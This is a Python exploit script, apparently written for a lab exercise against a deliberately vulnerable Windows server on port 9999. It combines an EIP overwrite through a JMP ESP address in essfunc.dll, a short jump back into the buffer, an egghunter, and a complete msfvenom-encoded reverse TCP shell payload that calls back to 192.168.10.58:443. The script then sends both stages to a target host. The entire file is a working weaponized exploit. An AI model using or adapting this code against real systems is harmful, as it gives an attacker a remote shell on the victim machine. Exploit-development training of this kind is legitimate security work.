#!/usr/bin/python
# -*- coding: utf-8 -*-
# EIP OVERWRITE W/ EGGHUNTER #

import socket

#JMP ESP in essfunc.dll
offset = "\xaf\x11\x50\x62"

#JMP back into buffer to execute egghunter
jmpback = "\xeb\xb0\x90\x90"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x90" * 10 + "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=192.168.10.58 LPORT=443 -f python -b "\x00\x0a\x0d" -v shell
#Payload size: 710 bytes
shell =  ""
shell += "T00WT00W"
shell += "\x89\xe7\xd9\xcd\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49"
shell += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
shell += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
shell += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shell += "\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x6b\x58\x6f"
shell += "\x72\x63\x30\x75\x50\x65\x50\x31\x70\x6d\x59\x49\x75"
shell += "\x35\x61\x4f\x30\x45\x34\x6e\x6b\x36\x30\x56\x50\x6c"
shell += "\x4b\x43\x62\x76\x6c\x4e\x6b\x72\x72\x77\x64\x6e\x6b"
shell += "\x72\x52\x56\x48\x74\x4f\x6d\x67\x32\x6a\x67\x56\x54"
shell += "\x71\x4b\x4f\x6e\x4c\x55\x6c\x73\x51\x63\x4c\x43\x32"
shell += "\x34\x6c\x61\x30\x6f\x31\x48\x4f\x74\x4d\x35\x51\x78"
shell += "\x47\x4d\x32\x39\x62\x33\x62\x43\x67\x4c\x4b\x42\x72"
shell += "\x52\x30\x6c\x4b\x63\x7a\x45\x6c\x6e\x6b\x70\x4c\x76"
shell += "\x71\x33\x48\x7a\x43\x62\x68\x47\x71\x68\x51\x32\x71"
shell += "\x4e\x6b\x33\x69\x47\x50\x46\x61\x7a\x73\x6e\x6b\x70"
shell += "\x49\x66\x78\x39\x73\x57\x4a\x43\x79\x4c\x4b\x74\x74"
shell += "\x4c\x4b\x57\x71\x78\x56\x30\x31\x6b\x4f\x6e\x4c\x4b"
shell += "\x71\x6a\x6f\x54\x4d\x33\x31\x48\x47\x36\x58\x4b\x50"
shell += "\x71\x65\x68\x76\x67\x73\x43\x4d\x79\x68\x37\x4b\x61"
shell += "\x6d\x34\x64\x61\x65\x6b\x54\x46\x38\x4e\x6b\x53\x68"
shell += "\x46\x44\x33\x31\x4e\x33\x55\x36\x6c\x4b\x74\x4c\x52"
shell += "\x6b\x4e\x6b\x30\x58\x55\x4c\x65\x51\x4a\x73\x6e\x6b"
shell += "\x67\x74\x6e\x6b\x75\x51\x78\x50\x4e\x69\x77\x34\x67"
shell += "\x54\x57\x54\x73\x6b\x73\x6b\x31\x71\x72\x79\x53\x6a"
shell += "\x43\x61\x69\x6f\x4b\x50\x63\x6f\x73\x6f\x30\x5a\x4c"
shell += "\x4b\x35\x42\x48\x6b\x4e\x6d\x73\x6d\x63\x58\x57\x43"
shell += "\x30\x32\x75\x50\x45\x50\x73\x58\x70\x77\x31\x63\x50"
shell += "\x32\x71\x4f\x31\x44\x31\x78\x50\x4c\x34\x37\x56\x46"
shell += "\x45\x57\x59\x6f\x58\x55\x38\x38\x7a\x30\x76\x61\x53"
shell += "\x30\x73\x30\x31\x39\x6f\x34\x32\x74\x50\x50\x42\x48"
shell += "\x46\x49\x6b\x30\x62\x4b\x77\x70\x49\x6f\x58\x55\x46"
shell += "\x30\x50\x50\x30\x50\x70\x50\x31\x50\x62\x70\x31\x50"
shell += "\x50\x50\x71\x78\x4b\x5a\x56\x6f\x6b\x6f\x49\x70\x49"
shell += "\x6f\x39\x45\x6c\x57\x61\x7a\x45\x55\x51\x78\x6b\x70"
shell += "\x49\x38\x64\x4a\x57\x4a\x53\x58\x36\x62\x57\x70\x43"
shell += "\x31\x4f\x4b\x6b\x39\x4a\x46\x33\x5a\x42\x30\x30\x56"
shell += "\x56\x37\x31\x78\x6e\x79\x59\x35\x71\x64\x75\x31\x49"
shell += "\x6f\x59\x45\x6d\x55\x69\x50\x44\x34\x54\x4c\x39\x6f"
shell += "\x50\x4e\x43\x38\x34\x35\x5a\x4c\x71\x78\x38\x70\x38"
shell += "\x35\x59\x32\x62\x76\x39\x6f\x58\x55\x61\x78\x42\x43"
shell += "\x70\x6d\x63\x54\x73\x30\x6c\x49\x7a\x43\x50\x57\x73"
shell += "\x67\x63\x67\x75\x61\x68\x76\x71\x7a\x76\x72\x33\x69"
shell += "\x63\x66\x78\x62\x6b\x4d\x52\x46\x58\x47\x73\x74\x31"
shell += "\x34\x35\x6c\x43\x31\x63\x31\x6c\x4d\x52\x64\x75\x74"
shell += "\x56\x70\x4b\x76\x47\x70\x67\x34\x32\x74\x56\x30\x53"
shell += "\x66\x72\x76\x72\x76\x52\x66\x71\x46\x62\x6e\x72\x76"
shell += "\x72\x76\x31\x43\x33\x66\x65\x38\x44\x39\x6a\x6c\x67"
shell += "\x4f\x6e\x66\x39\x6f\x58\x55\x6e\x69\x6b\x50\x62\x6e"
shell += "\x52\x76\x37\x36\x39\x6f\x56\x50\x53\x58\x66\x68\x4d"
shell += "\x57\x35\x4d\x53\x50\x59\x6f\x6a\x75\x4d\x6b\x78\x70"
shell += "\x4d\x65\x4c\x62\x33\x66\x31\x78\x39\x36\x6e\x75\x4f"
shell += "\x4d\x6d\x4d\x69\x6f\x39\x45\x57\x4c\x66\x66\x31\x6c"
shell += "\x47\x7a\x6b\x30\x49\x6b\x6b\x50\x32\x55\x37\x75\x6d"
shell += "\x6b\x30\x47\x34\x53\x74\x32\x52\x4f\x33\x5a\x43\x30"
shell += "\x31\x43\x69\x6f\x58\x55\x41\x41"


firststage = "TRUN ." + shell

crap = "\x90" * 70 + egghunter + "\x90" * (81 - len(egghunter)) + offset + jmpback + "\x43" * 2243 

#print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+=crap 

print "[*] Sending evil shenanigans - be patient"
print "[*] First Stage : "+ str(len(firststage)) + " bytes"
print "[*] Second Stage : " +str(len(buffer)) + " bytes"
#print "[*] Sending " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.178', 9999))
s.send(firststage)
s.recv(1024)
s.send(buffer)
s.close()
